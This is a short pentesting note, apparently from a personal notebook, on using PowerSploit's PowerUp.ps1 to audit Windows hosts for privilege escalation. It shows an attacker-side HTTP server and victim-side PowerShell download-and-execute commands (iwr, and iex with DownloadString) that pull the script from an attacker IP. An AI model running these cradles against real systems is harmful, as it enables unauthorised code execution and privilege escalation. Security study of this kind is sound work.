
### Overview
---
``PowerUp.ps1`` is a Privilege Escalation-based PowerShell module part of the [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master) project, and it comes native on Kali Linux.  It contains a plethora of PowerShell scripts meant to exploit specific privilege escalation vulnerabilities, but it's most valuable script is ``Invoke-PrivEscAudit`` (or the alias ``Invoke-AllChecks``) which quickly and succinctly scrubs the host for potential privilege escalation vectors, as well as provides recommendations for how to abuse found vulnerabilities.

>[!info]
>While not as massive and verbose as ``winPEAS``, it is much more succinct and not overwhelming with information.


### General Usage
---
```shell
### On Attacker ###

# Default Kali Location:
# /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1

# Create a Simple Web Server Hosting Scripts
python -m http.server --directory /usr/share/windows-resources/powersploit/Privesc
```

```powershell
### On Victim ###

# Download Script to Disk
iwr 'http://<ip_addr>:8000/PowerUp.ps1' -o PowerUp.ps1 -UseBasicParsing
. PowerUp.ps1

# OR Load Script into Memory
iex ([System.Net.WebClient]::new().DownloadString('http://<ip_addr>:8000/PowerUp.ps1'))

# Check for Privilege Escalation vectors
Invoke-PrivEscAudit # or Invoke-AllChecks (alias)
```